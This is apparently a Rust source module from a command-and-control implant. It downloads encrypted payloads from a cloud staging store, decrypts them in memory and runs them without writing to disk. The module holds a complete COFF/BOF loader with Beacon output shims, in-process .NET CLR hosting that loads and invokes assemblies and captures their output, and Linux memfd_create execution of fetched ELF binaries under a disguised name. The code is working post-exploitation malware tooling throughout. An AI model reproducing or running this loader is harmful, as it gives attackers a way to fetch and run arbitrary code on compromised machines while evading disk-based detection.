//! In-memory execution module — BOF/COFF loader, Execute-Assembly (.NET CLR),
//! and memfd_exec (Linux ELF in-memory).
//!
//! Staging flow: server encrypts binary → cloud → agent downloads → decrypts to RAM → executes.
//! Nothing touches disk.

use std::sync::Arc;
use crate::exec::AgentState;
use crate::transport::SharedTransport;

// ══════════════════════════════════════════════════════════════════════════════
// PUBLIC ENTRY POINTS
// ══════════════════════════════════════════════════════════════════════════════

/// Execute a BOF/COFF object file in-memory (Windows only).
pub fn bof_exec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged(transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _bof_exec_windows(&data, args) }

    #[cfg(not(windows))]
    { let _ = (&data, args); "[bof] BOF/COFF execution is Windows-only".to_string() }
}

/// Execute a .NET assembly in-memory via CLR hosting (Windows only).
pub fn assembly_exec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged(transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _assembly_exec_windows(&data, args) }

    #[cfg(not(windows))]
    { let _ = (&data, args); "[assembly] Execute-Assembly requires Windows/.NET CLR".to_string() }
}

/// Execute an ELF binary in-memory via memfd_create (Linux only).
pub fn memexec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged(transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(target_os = "linux")]
    { _memexec_linux(&data, args) }

    #[cfg(not(target_os = "linux"))]
    { let _ = (&data, args); "[memexec] memfd_exec is Linux-only".to_string() }
}

// ══════════════════════════════════════════════════════════════════════════════
// SHARED: fetch + decrypt staged binary
// ══════════════════════════════════════════════════════════════════════════════

fn _fetch_staged(
    transport: &SharedTransport,
    staging_path: &str,
    session_key: &[u8; 32],
) -> Result<Vec<u8>, String> {
    let enc_data = transport.download(staging_path)
        .ok_or_else(|| "[error] Failed to download staged binary from cloud".to_string())?;
    if enc_data.is_empty() {
        return Err("[error] Staged file is empty".to_string());
    }
    crate::crypto::decrypt_staging(&enc_data, session_key)
        .ok_or_else(|| "[error] Staging decryption failed".to_string())
}

// ══════════════════════════════════════════════════════════════════════════════
// BOF/COFF LOADER — Windows
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
fn _bof_exec_windows(coff_data: &[u8], args: &str) -> String {
    use std::collections::HashMap;

    if coff_data.len() < 20 {
        return "[bof] Invalid COFF: too small".to_string();
    }

    let machine      = u16::from_le_bytes([coff_data[0], coff_data[1]]);
    let num_sections = u16::from_le_bytes([coff_data[2], coff_data[3]]) as usize;
    let symtab_off   = u32::from_le_bytes([coff_data[4], coff_data[5], coff_data[6], coff_data[7]]) as usize;
    let num_symbols  = u32::from_le_bytes([coff_data[8], coff_data[9], coff_data[10], coff_data[11]]) as usize;
    let opt_hdr_size = u16::from_le_bytes([coff_data[12], coff_data[13]]) as usize;

    if machine != 0x8664 {
        return format!("[bof] Unsupported machine type: 0x{:04x} (need AMD64)", machine);
    }

    let sections_off = 20 + opt_hdr_size;
    let strtab_off = symtab_off + num_symbols * 18;

    // Parse section headers
    struct Sec { _name: String, vsize: u32, raw_off: usize, raw_sz: usize, reloc_off: usize, nreloc: usize, chars: u32 }
    let mut sections: Vec<Sec> = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let o = sections_off + i * 40;
        if o + 40 > coff_data.len() { return "[bof] Section header OOB".to_string(); }
        let name_bytes = &coff_data[o..o+8];
        let name = if name_bytes[0] == b'/' {
            let s = std::str::from_utf8(&name_bytes[1..]).unwrap_or("").trim_end_matches('\0');
            let so: usize = s.parse().unwrap_or(0);
            _coff_strtab(coff_data, strtab_off + so)
        } else {
            let end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&name_bytes[..end]).to_string()
        };
        sections.push(Sec {
            _name: name,
            vsize:     u32::from_le_bytes([coff_data[o+8], coff_data[o+9], coff_data[o+10], coff_data[o+11]]),
            raw_sz:    u32::from_le_bytes([coff_data[o+16], coff_data[o+17], coff_data[o+18], coff_data[o+19]]) as usize,
            raw_off:   u32::from_le_bytes([coff_data[o+20], coff_data[o+21], coff_data[o+22], coff_data[o+23]]) as usize,
            reloc_off: u32::from_le_bytes([coff_data[o+24], coff_data[o+25], coff_data[o+26], coff_data[o+27]]) as usize,
            nreloc:    u16::from_le_bytes([coff_data[o+32], coff_data[o+33]]) as usize,
            chars:     u32::from_le_bytes([coff_data[o+36], coff_data[o+37], coff_data[o+38], coff_data[o+39]]),
        });
    }

    // Allocate section buffers
    let mut buffers: Vec<Vec<u8>> = Vec::with_capacity(num_sections);
    for sec in &sections {
        let sz = std::cmp::max(sec.raw_sz, sec.vsize as usize);
        let mut buf = vec![0u8; sz];
        if sec.raw_sz > 0 && sec.raw_off + sec.raw_sz <= coff_data.len() {
            buf[..sec.raw_sz].copy_from_slice(&coff_data[sec.raw_off..sec.raw_off + sec.raw_sz]);
        }
        buffers.push(buf);
    }

    // Parse symbols
    struct Sym { name: String, value: u32, sec_num: i16, class: u8 }
    let mut symbols: Vec<Sym> = Vec::with_capacity(num_symbols);
    let mut si = 0usize;
    while si < num_symbols {
        let o = symtab_off + si * 18;
        if o + 18 > coff_data.len() { break; }
        let name = if coff_data[o..o+4] == [0,0,0,0] {
            let so = u32::from_le_bytes([coff_data[o+4], coff_data[o+5], coff_data[o+6], coff_data[o+7]]) as usize;
            _coff_strtab(coff_data, strtab_off + so)
        } else {
            let end = coff_data[o..o+8].iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&coff_data[o..o+end]).to_string()
        };
        let num_aux = coff_data[o+17] as usize;
        symbols.push(Sym {
            name,
            value:   u32::from_le_bytes([coff_data[o+8], coff_data[o+9], coff_data[o+10], coff_data[o+11]]),
            sec_num: i16::from_le_bytes([coff_data[o+12], coff_data[o+13]]),
            class:   coff_data[o+16],
        });
        si += 1 + num_aux;
    }

    // Resolve externals
    let mut resolved: HashMap<String, usize> = HashMap::new();

    // Beacon API output buffer
    static mut BEACON_BUF: *const std::sync::Mutex<Vec<u8>> = std::ptr::null();
    let output_buf = Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    unsafe { BEACON_BUF = Arc::as_ptr(&output_buf); }

    unsafe extern "C" fn _beacon_printf(_ty: i32, fmt: *const u8) {
        if fmt.is_null() { return; }
        let s = std::ffi::CStr::from_ptr(fmt as *const i8);
        if let Ok(mut g) = (*BEACON_BUF).lock() { g.extend_from_slice(s.to_bytes()); g.push(b'\n'); }
    }
    unsafe extern "C" fn _beacon_output(_ty: i32, data: *const u8, len: i32) {
        if data.is_null() || len <= 0 { return; }
        let sl = std::slice::from_raw_parts(data, len as usize);
        if let Ok(mut g) = (*BEACON_BUF).lock() { g.extend_from_slice(sl); }
    }

    resolved.insert("BeaconPrintf".into(), _beacon_printf as usize);
    resolved.insert("BeaconOutput".into(), _beacon_output as usize);
    resolved.insert("__imp_BeaconPrintf".into(), _beacon_printf as usize);
    resolved.insert("__imp_BeaconOutput".into(), _beacon_output as usize);

    // Resolve DLL imports (__imp_MODULE$Function)
    for sym in &symbols {
        if sym.sec_num != 0 || sym.class != 2 { continue; }
        if resolved.contains_key(&sym.name) { continue; }
        let imp_name = sym.name.strip_prefix("__imp_").unwrap_or(&sym.name);
        if let Some(dp) = imp_name.find('$') {
            let module = &imp_name[..dp];
            let func = &imp_name[dp+1..];
            unsafe {
                use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, LoadLibraryA, GetProcAddress};
                let mname = format!("{}.dll\0", module);
                let mut h = GetModuleHandleA(mname.as_ptr());
                if h == 0 { h = LoadLibraryA(mname.as_ptr()); }
                if h != 0 {
                    let fname = format!("{}\0", func);
                    if let Some(a) = GetProcAddress(h, fname.as_ptr()) {
                        resolved.insert(sym.name.clone(), a as usize);
                    }
                }
            }
        }
    }

    // Apply relocations
    for (si, sec) in sections.iter().enumerate() {
        for r in 0..sec.nreloc {
            let ro = sec.reloc_off + r * 10;
            if ro + 10 > coff_data.len() { continue; }
            let va      = u32::from_le_bytes([coff_data[ro], coff_data[ro+1], coff_data[ro+2], coff_data[ro+3]]) as usize;
            let sym_idx = u32::from_le_bytes([coff_data[ro+4], coff_data[ro+5], coff_data[ro+6], coff_data[ro+7]]) as usize;
            let rtype   = u16::from_le_bytes([coff_data[ro+8], coff_data[ro+9]]);
            if sym_idx >= symbols.len() { continue; }
            let sym = &symbols[sym_idx];

            let sym_addr: usize = if sym.sec_num > 0 {
                let ts = (sym.sec_num - 1) as usize;
                if ts < buffers.len() { buffers[ts].as_ptr() as usize + sym.value as usize } else { continue; }
            } else if let Some(&a) = resolved.get(&sym.name) { a }
            else { continue; };

            let buf = &mut buffers[si];
            if va + 4 > buf.len() { continue; }
            match rtype {
                0x0001 => { if va + 8 <= buf.len() { buf[va..va+8].copy_from_slice(&(sym_addr as u64).to_le_bytes()); } }
                0x0003 => { let rel = (sym_addr as i64 - (buf.as_ptr() as usize + va + 4) as i64) as i32; buf[va..va+4].copy_from_slice(&rel.to_le_bytes()); }
                0x0004 => { let rel = (sym_addr as i64 - (buf.as_ptr() as usize + va + 4) as i64) as i32; buf[va..va+4].copy_from_slice(&rel.to_le_bytes()); }
                0x0005..=0x0009 => { let add = (rtype - 4) as usize; let rel = (sym_addr as i64 - (buf.as_ptr() as usize + va + 4 + add) as i64) as i32; buf[va..va+4].copy_from_slice(&rel.to_le_bytes()); }
                _ => {}
            }
        }
    }

    // Make .text executable
    unsafe {
        use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ};
        for (i, sec) in sections.iter().enumerate() {
            if sec.chars & 0x20000020 != 0 {
                let mut old = 0u32;
                VirtualProtect(buffers[i].as_ptr() as _, buffers[i].len(), PAGE_EXECUTE_READ, &mut old);
            }
        }
    }

    // Find go() entry
    let entry = symbols.iter().find_map(|s| {
        if (s.name == "go" || s.name == "_go") && s.sec_num > 0 {
            let si = (s.sec_num - 1) as usize;
            if si < buffers.len() { Some(buffers[si].as_ptr() as usize + s.value as usize) } else { None }
        } else { None }
    });
    let entry = match entry {
        Some(a) => a,
        None => return "[bof] No entry point 'go' found".to_string(),
    };

    // Pack args
    let packed = _bof_pack_args(args);

    // Call go(char* args, int len)
    unsafe {
        type GoFn = unsafe extern "C" fn(*const u8, i32);
        let go: GoFn = std::mem::transmute(entry);
        go(packed.as_ptr(), packed.len() as i32);
    }

    // Cleanup
    for buf in &mut buffers { buf.iter_mut().for_each(|b| *b = 0); }

    let out = output_buf.lock().unwrap();
    if out.is_empty() { "[bof] OK (no output)".to_string() }
    else { String::from_utf8_lossy(&out).to_string() }
}

#[cfg(windows)]
fn _coff_strtab(data: &[u8], off: usize) -> String {
    if off >= data.len() { return String::new(); }
    let end = data[off..].iter().position(|&b| b == 0).unwrap_or(0);
    String::from_utf8_lossy(&data[off..off+end]).to_string()
}

#[cfg(windows)]
fn _bof_pack_args(args: &str) -> Vec<u8> {
    if args.is_empty() { return vec![0, 0, 0, 0]; }
    let sb = args.as_bytes();
    let entry_len = (sb.len() + 1) as u32;
    let total = (4 + sb.len() + 1) as u32;
    let mut buf = Vec::with_capacity(4 + total as usize);
    buf.extend_from_slice(&total.to_le_bytes());
    buf.extend_from_slice(&entry_len.to_le_bytes());
    buf.extend_from_slice(sb);
    buf.push(0);
    buf
}

// ══════════════════════════════════════════════════════════════════════════════
// EXECUTE-ASSEMBLY — Windows (.NET CLR Hosting)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
fn _assembly_exec_windows(assembly_bytes: &[u8], args: &str) -> String {
    use std::ptr;
    use std::os::windows::ffi::OsStrExt;
    use std::ffi::OsStr;

    unsafe {
        use windows_sys::Win32::System::Com::CoInitializeEx;
        CoInitializeEx(ptr::null(), 0);
    }

    unsafe {
        use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

        let mscoree = LoadLibraryA(b"mscoree.dll\0".as_ptr());
        if mscoree == 0 {
            return "[assembly] Failed to load mscoree.dll — .NET not installed?".to_string();
        }

        let clr_create = GetProcAddress(mscoree, b"CLRCreateInstance\0".as_ptr());
        if clr_create.is_none() {
            return "[assembly] CLRCreateInstance not found".to_string();
        }

        // CLRCreateInstance → ICLRMetaHost
        let clsid_meta: [u8; 16] = [0xd3,0x32,0xdb,0x9e,0x2b,0x9b,0x62,0x4a,0x83,0xc7,0xda,0x86,0x45,0xf3,0x20,0x6c];
        let iid_meta: [u8; 16] = [0x01,0xab,0x2c,0xd1,0x55,0xa7,0x4a,0x46,0xb7,0x0d,0x6a,0xd6,0x7b,0x9a,0x09,0x88];

        type CLRCreateFn = unsafe extern "system" fn(*const u8, *const u8, *mut *mut std::ffi::c_void) -> i32;
        let clr_create: CLRCreateFn = std::mem::transmute(clr_create.unwrap());
        let mut meta_host: *mut std::ffi::c_void = ptr::null_mut();
        let hr = clr_create(clsid_meta.as_ptr(), iid_meta.as_ptr(), &mut meta_host);
        if hr < 0 { return format!("[assembly] CLRCreateInstance failed: 0x{:08x}", hr as u32); }

        // GetRuntime v4.0.30319
        let vt = *(meta_host as *const *const usize);
        let get_runtime: unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(3));
        let ver: Vec<u16> = OsStr::new("v4.0.30319").encode_wide().chain(std::iter::once(0)).collect();
        let iid_ri: [u8; 16] = [0x5c,0x01,0xe7,0xbd,0x04,0x55,0xb5,0x47,0x80,0x29,0x24,0xc5,0x78,0x98,0x3d,0x6e];
        let mut ri: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_runtime(meta_host, ver.as_ptr(), iid_ri.as_ptr(), &mut ri);
        if hr < 0 { return format!("[assembly] GetRuntime v4.0 failed: 0x{:08x}", hr as u32); }

        // ICorRuntimeHost
        let vt = *(ri as *const *const usize);
        let get_iface: unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(9));
        let clsid_crh: [u8; 16] = [0x63,0xb7,0x7a,0xcb,0x79,0x5b,0x61,0x49,0x93,0x17,0x3b,0x00,0x84,0x96,0x54,0x00];
        let iid_crh: [u8; 16] = [0x02,0xd9,0x50,0xcb,0x9b,0xf8,0x07,0x46,0xba,0x6c,0x11,0xd1,0x5b,0xab,0xb2,0x5d];
        let mut rh: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_iface(ri, clsid_crh.as_ptr(), iid_crh.as_ptr(), &mut rh);
        if hr < 0 { return format!("[assembly] GetInterface failed: 0x{:08x}", hr as u32); }

        // Start CLR
        let vt = *(rh as *const *const usize);
        let start: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 = std::mem::transmute(*vt.add(10));
        let hr = start(rh);
        if hr < 0 && hr != 1 { return format!("[assembly] CLR Start failed: 0x{:08x}", hr as u32); }

        // GetDefaultDomain
        let get_domain: unsafe extern "system" fn(*mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(13));
        let mut domain_unk: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_domain(rh, &mut domain_unk);
        if hr < 0 { return format!("[assembly] GetDefaultDomain failed: 0x{:08x}", hr as u32); }

        // QI _AppDomain
        let iid_ad: [u8; 16] = [0x99,0x0e,0x44,0x05,0xdf,0x31,0x20,0x46,0x84,0x17,0xce,0x09,0x86,0x79,0x05,0xc5];
        let qi: unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*(*(domain_unk as *const *const usize)).add(0));
        let mut ad: *mut std::ffi::c_void = ptr::null_mut();
        let hr = qi(domain_unk, iid_ad.as_ptr(), &mut ad);
        if hr < 0 { return format!("[assembly] QI _AppDomain failed: 0x{:08x}", hr as u32); }

        // Load_3 (byte[] → _Assembly)
        let vt = *(ad as *const *const usize);
        let load_3: unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(45));

        // Create SAFEARRAY for assembly bytes
        use windows_sys::Win32::System::Ole::{SafeArrayCreate, SafeArrayAccessData, SafeArrayUnaccessData, SafeArrayDestroy};
        use windows_sys::Win32::System::Com::SAFEARRAYBOUND;
        use windows_sys::Win32::System::Variant::VT_UI1;
        let bound = SAFEARRAYBOUND { cElements: assembly_bytes.len() as u32, lLbound: 0 };
        let sa = SafeArrayCreate(VT_UI1 as u16, 1, &bound);
        if sa.is_null() { return "[assembly] SafeArrayCreate failed".to_string(); }
        let mut raw: *mut std::ffi::c_void = ptr::null_mut();
        SafeArrayAccessData(sa, &mut raw);
        std::ptr::copy_nonoverlapping(assembly_bytes.as_ptr(), raw as *mut u8, assembly_bytes.len());
        SafeArrayUnaccessData(sa);

        let mut asm_obj: *mut std::ffi::c_void = ptr::null_mut();
        let hr = load_3(ad, sa as *mut std::ffi::c_void, &mut asm_obj);
        SafeArrayDestroy(sa);
        if hr < 0 { return format!("[assembly] Assembly.Load failed: 0x{:08x}", hr as u32); }

        // get_EntryPoint
        let vt = *(asm_obj as *const *const usize);
        let get_ep: unsafe extern "system" fn(*mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> i32
            = std::mem::transmute(*vt.add(17));
        let mut mi: *mut std::ffi::c_void = ptr::null_mut();
        let hr = get_ep(asm_obj, &mut mi);
        if hr < 0 { return format!("[assembly] get_EntryPoint failed: 0x{:08x}", hr as u32); }

        // Invoke_3 — redirect stdout via pipe
        use windows_sys::Win32::System::Pipes::CreatePipe;
        use windows_sys::Win32::System::Console::{SetStdHandle, GetStdHandle, STD_OUTPUT_HANDLE};
        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};

        let mut rd = INVALID_HANDLE_VALUE;
        let mut wr = INVALID_HANDLE_VALUE;
        CreatePipe(&mut rd, &mut wr, ptr::null(), 0);
        let old_out = GetStdHandle(STD_OUTPUT_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, wr);

        // Build args SAFEARRAY (string[])
        let argv: Vec<&str> = if args.is_empty() { vec![] } else { args.split_whitespace().collect() };
        let params = _build_invoke_params(&argv);

        let vt = *(mi as *const *const usize);
        let invoke_3: unsafe extern "system" fn(*mut std::ffi::c_void, [u8; 24], *mut std::ffi::c_void, *mut [u8; 24]) -> i32
            = std::mem::transmute(*vt.add(42));
        let empty_var = [0u8; 24];
        let mut ret_var = [0u8; 24];
        let _hr = invoke_3(mi, empty_var, params, &mut ret_var);

        // Restore stdout + read captured
        CloseHandle(wr);
        SetStdHandle(STD_OUTPUT_HANDLE, old_out);

        let mut output = Vec::new();
        let mut rbuf = [0u8; 4096];
        loop {
            let mut n = 0u32;
            use windows_sys::Win32::Storage::FileSystem::ReadFile;
            let ok = ReadFile(rd, rbuf.as_mut_ptr() as _, rbuf.len() as u32, &mut n, ptr::null_mut());
            if ok == 0 || n == 0 { break; }
            output.extend_from_slice(&rbuf[..n as usize]);
            if output.len() > 4 * 1024 * 1024 { break; }
        }
        CloseHandle(rd);
        if !params.is_null() { SafeArrayDestroy(params as *mut _); }

        if output.is_empty() { "[assembly] OK (no output)".to_string() }
        else { String::from_utf8_lossy(&output).to_string() }
    }
}

#[cfg(windows)]
unsafe fn _build_invoke_params(argv: &[&str]) -> *mut std::ffi::c_void {
    use std::os::windows::ffi::OsStrExt;
    use std::ffi::OsStr;
    use windows_sys::Win32::System::Ole::{SafeArrayCreate, SafeArrayPutElement};
    use windows_sys::Win32::Foundation::SysAllocStringLen;
    use windows_sys::Win32::System::Com::SAFEARRAYBOUND;
    use windows_sys::Win32::System::Variant::VT_VARIANT;

    let outer_b = SAFEARRAYBOUND { cElements: 1, lLbound: 0 };
    let outer = SafeArrayCreate(VT_VARIANT as u16, 1, &outer_b);
    if outer.is_null() { return std::ptr::null_mut(); }

    let inner_b = SAFEARRAYBOUND { cElements: argv.len() as u32, lLbound: 0 };
    let inner = SafeArrayCreate(8u16 /* VT_BSTR */, 1, &inner_b);
    if !inner.is_null() {
        for (i, &a) in argv.iter().enumerate() {
            let w: Vec<u16> = OsStr::new(a).encode_wide().chain(std::iter::once(0)).collect();
            let bstr = SysAllocStringLen(w.as_ptr(), w.len() as u32 - 1);
            let idx = i as i32;
            SafeArrayPutElement(inner, &idx, bstr as *const _);
        }
    }

    // VARIANT holding VT_ARRAY|VT_BSTR
    let mut variant = [0u8; 24];
    let vt: u16 = 0x2000 | 8;
    variant[0..2].copy_from_slice(&vt.to_le_bytes());
    let ptr_bytes = (inner as usize).to_le_bytes();
    variant[8..8+std::mem::size_of::<usize>()].copy_from_slice(&ptr_bytes);
    let idx: i32 = 0;
    SafeArrayPutElement(outer, &idx, variant.as_ptr() as *const _);
    outer as *mut std::ffi::c_void
}

// ══════════════════════════════════════════════════════════════════════════════
// MEMFD_EXEC — Linux
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(target_os = "linux")]
fn _memexec_linux(elf_data: &[u8], args: &str) -> String {
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    if elf_data.len() < 4 || &elf_data[0..4] != b"\x7fELF" {
        return "[memexec] Invalid ELF magic".to_string();
    }

    let fd = unsafe { libc::syscall(libc::SYS_memfd_create, b"ld\0".as_ptr(), 1u32) as i32 };
    if fd < 0 {
        return format!("[memexec] memfd_create failed: {}", std::io::Error::last_os_error());
    }

    {
        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        if let Err(e) = file.write_all(elf_data) {
            return format!("[memexec] write failed: {}", e);
        }
        std::mem::forget(file); // keep fd open
    }

    // Parse args
    let argv: Vec<String> = if args.is_empty() {
        vec!["prog".into()]
    } else {
        let mut v = vec!["prog".into()];
        v.extend(_split_args(args));
        v
    };

    let mut pipe_out = [0i32; 2];
    unsafe { libc::pipe(pipe_out.as_mut_ptr()); }

    let pid = unsafe { libc::fork() };
    match pid {
        -1 => { unsafe { libc::close(fd); } format!("[memexec] fork failed: {}", std::io::Error::last_os_error()) }
        0 => unsafe {
            libc::dup2(pipe_out[1], 1);
            libc::dup2(pipe_out[1], 2);
            libc::close(pipe_out[0]);
            libc::close(pipe_out[1]);

            let c_argv: Vec<std::ffi::CString> = argv.iter()
                .map(|a| std::ffi::CString::new(a.as_str()).unwrap_or_default()).collect();
            let c_ptrs: Vec<*const libc::c_char> = c_argv.iter()
                .map(|a| a.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();
            let c_env: Vec<std::ffi::CString> = std::env::vars()
                .map(|(k,v)| std::ffi::CString::new(format!("{}={}", k, v)).unwrap_or_default()).collect();
            let c_env_ptrs: Vec<*const libc::c_char> = c_env.iter()
                .map(|e| e.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();

            let path = format!("/proc/self/fd/{}\0", fd);
            libc::execve(path.as_ptr() as _, c_ptrs.as_ptr(), c_env_ptrs.as_ptr());
            libc::_exit(127);
        },
        child => {
            unsafe { libc::close(pipe_out[1]); libc::close(fd); }

            let mut output = Vec::new();
            let mut buf = [0u8; 4096];
            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);

            loop {
                if std::time::Instant::now() > deadline {
                    unsafe { libc::kill(child, libc::SIGKILL); }
                    output.extend_from_slice(b"\n[TIMEOUT 60s]");
                    break;
                }
                unsafe { let fl = libc::fcntl(pipe_out[0], libc::F_GETFL); libc::fcntl(pipe_out[0], libc::F_SETFL, fl | libc::O_NONBLOCK); }
                let n = unsafe { libc::read(pipe_out[0], buf.as_mut_ptr() as _, buf.len()) };
                if n > 0 {
                    output.extend_from_slice(&buf[..n as usize]);
                    if output.len() > 4 * 1024 * 1024 { output.extend_from_slice(b"\n[TRUNCATED]"); break; }
                } else if n == 0 { break; }
                else { std::thread::sleep(std::time::Duration::from_millis(50)); }

                let mut st = 0i32;
                let w = unsafe { libc::waitpid(child, &mut st, libc::WNOHANG) };
                if w == child {
                    loop { let n = unsafe { libc::read(pipe_out[0], buf.as_mut_ptr() as _, buf.len()) }; if n <= 0 { break; } output.extend_from_slice(&buf[..n as usize]); }
                    let code = if libc::WIFEXITED(st) { libc::WEXITSTATUS(st) } else { -1 };
                    output.extend_from_slice(format!("\n[exit {}]", code).as_bytes());
                    break;
                }
            }
            unsafe { libc::close(pipe_out[0]); let mut st = 0; libc::waitpid(child, &mut st, 0); }

            if output.is_empty() { "[memexec] OK (no output)".to_string() }
            else { String::from_utf8_lossy(&output).to_string() }
        }
    }
}

#[cfg(target_os = "linux")]
fn _split_args(s: &str) -> Vec<String> {
    let mut res = Vec::new();
    let mut cur = String::new();
    let mut sq = false;
    let mut dq = false;
    let mut esc = false;
    for ch in s.chars() {
        if esc { cur.push(ch); esc = false; continue; }
        match ch {
            '\\' if !sq => esc = true,
            '\'' if !dq => sq = !sq,
            '"' if !sq => dq = !dq,
            ' ' | '\t' if !sq && !dq => { if !cur.is_empty() { res.push(std::mem::take(&mut cur)); } }
            _ => cur.push(ch),
        }
    }
    if !cur.is_empty() { res.push(cur); }
    res
}
